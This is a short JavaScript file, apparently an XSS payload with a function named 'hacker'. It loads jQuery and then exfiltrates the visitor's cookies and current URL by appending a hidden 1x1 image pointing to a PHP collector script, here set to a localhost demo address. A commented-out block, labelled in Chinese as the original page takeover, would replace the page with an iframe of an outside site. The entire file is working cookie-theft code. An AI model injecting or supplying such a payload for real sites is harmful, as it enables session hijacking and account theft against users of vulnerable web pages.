function hacker(){
	$(function(){
		/*原有页面改为获取cookie
		 *
		$('*').css({'margin':'0px','padding':'0px','overflow':'hidden','position':'relative'});
		$('*','body').fadeOut();
		$('body,html').css({'width':'100%','height':'100%'});
		$('body').html("<iframe ></iframe>");
		$('iframe').css({'width':'100%','height':'100%','overflow-x':'hidden','position':'relative'});
		$('iframe').attr('src','http://blog.h2ero.cn');*/
		var src='http://localhost/PHP/demo/demo.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href);
		$('body').append('<img style="width:1px;height:1px;" src="'+src+'"/>');
	});
	
}
	function include_js(file) {
		var _doc = document.getElementsByTagName('head')[0];
		var js = document.createElement('script');
		js.setAttribute('type', 'text/javascript');
		js.setAttribute('src', file);
		_doc.appendChild(js);

		if(!/*@cc_on!@*/0) {//if not IE
			//Firefox2、Firefox3、Safari3.1+、Opera9.6+ support js.onload
			js.onload = function() {
				hacker();
			}
		} else {
			//IE6、IE7 support js.onreadystatechange
			js.onreadystatechange = function() {
				if(js.readyState == 'loaded' || js.readyState == 'complete') {
				hacker();
				}
			}
		}

		return false;
	}
	//execution function
	include_js('http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.6.min.js');
